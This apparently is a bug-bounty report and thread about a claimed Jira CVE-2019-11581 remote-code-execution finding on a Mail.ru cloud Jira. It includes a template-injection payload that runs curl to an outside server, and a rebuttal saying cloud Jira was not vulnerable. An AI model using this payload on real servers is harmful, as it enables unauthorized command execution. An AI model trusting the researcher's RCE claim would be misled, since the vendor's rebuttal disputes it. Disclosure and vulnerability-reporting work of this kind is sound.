title: RCE Jira(CVE-2019–11581) [my-com.atlassian.net]
vulnerability_information:
Hello,

##Summary
i found the domain  ` my-com.atlassian.net ` is vulnerable with RCE  Jira(CVE-2019–11581)  via contact admin function

##POC
- on page https://my-com.atlassian.net/secure/ContactAdministrators!default.jspa
- use payload  on Subject & Request details

` $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://your_server_here/rcetest?a=a').waitFor() ` 


{F597959}

- Then I immediately received a bunch of curl callbacks on my host from 185.6.245.156, which confirmed the vulnerability.


{F597958}

## Impact

Command Injection and RCE

Regards
vulnerability_information_html:
Hello,

Summary

i found the domain my-com.atlassian.net is vulnerable with RCE Jira(CVE-2019–11581) via contact admin function

POC

  • on page https://my-com.atlassian.net/secure/ContactAdministrators!default.jspa
  • use payload on Subject & Request details

$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://your_server_here/rcetest?a=a').waitFor()

  • Then I immediately received a bunch of curl callbacks on my host from 185.6.245.156, which confirmed the vulnerability.

Impact

Command Injection and RCE

Regards

my-com.atlassian.net has ip 18.184.99.139.
185.6.245.156 is ip office Mail.ru. 

Most likely, the jira administrator clicked on the link that you sent via the contact form. Pay attention to request headers (User Agent and Accept). This is not like the curl request header

activities.message:
Hello H1 team
I've reported an RCE with JIRA and make a POC with Curl command and i got a curl connection back from mailru server ,the team closed my report as informative and fixed the issue by disable the contact admin vulnerable page

Thanks

activities.message:
For everyone who are here
As you can see researcher reported us a potential issue on https://my-com.atlassian.net

# First point
my-com.atlassian.net is a Cloud based jira and everything - software, infrastructure etc belongs to Atlassian company. If you believe that you found a security issue in Atlassian projects/products - please report directly to them https://bugcrowd.com/atlassian

Then researcher sent a request with RCE PoC (CVE-2019–11581) that may trigger server to execute curl with a burpcollobrator host. 

# Second point
Of course it doesn't happened as Cloud Jira is not vulnerable to this CVE, please follow https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html - *Customers using Jira Cloud are not affected.*

After few hours when our administrator came to our beautiful office in Moscow he found a few replies in a feedback form in a cloud Jira. He checked it manually from our office's IP as you can see on the screenshots provided by researcher. 

# Third point
It can confuse but when you are exploiting this CVE your RCE must be executed immediately. This confusion is a reason why we marked this report as Informative

We've shared this information with a researcher but then he started to flood Jira's feedback form. Then administrator just disabled this form as it just a test jira.

# Fourth point
We are trying hard to do everything for our bug bounty program and for our researcher. We are transparent and ready to share everything that should be enough to understand what really happening on our side.

Then researcher made a tweets that we closed a report with a RCE as informative. 

# Fifth point
This is a cloud Jira and no RCE.

Thank you for trying to make MRG secure and we are always happy to discuss and be transparent in our decisions
activities.markdown_message:
For everyone who are here
As you can see researcher reported us a potential issue on https://my-com.atlassian.net

First point

my-com.atlassian.net is a Cloud based jira and everything - software, infrastructure etc belongs to Atlassian company. If you believe that you found a security issue in Atlassian projects/products - please report directly to them https://bugcrowd.com/atlassian

Then researcher sent a request with RCE PoC (CVE-2019–11581) that may trigger server to execute curl with a burpcollobrator host.

Second point

Of course it doesn't happened as Cloud Jira is not vulnerable to this CVE, please follow https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html - Customers using Jira Cloud are not affected.

After few hours when our administrator came to our beautiful office in Moscow he found a few replies in a feedback form in a cloud Jira. He checked it manually from our office's IP as you can see on the screenshots provided by researcher.

Third point

It can confuse but when you are exploiting this CVE your RCE must be executed immediately. This confusion is a reason why we marked this report as Informative

We've shared this information with a researcher but then he started to flood Jira's feedback form. Then administrator just disabled this form as it just a test jira.

Fourth point

We are trying hard to do everything for our bug bounty program and for our researcher. We are transparent and ready to share everything that should be enough to understand what really happening on our side.

Then researcher made a tweets that we closed a report with a RCE as informative.

Fifth point

This is a cloud Jira and no RCE.

Thank you for trying to make MRG secure and we are always happy to discuss and be transparent in our decisions

summaries.content_html:
i have found Jira(CVE-2019–11581) and after getting a connection back with CURL command from a MAILRU IP

POC

the team restricted the access into the page and closed the report !
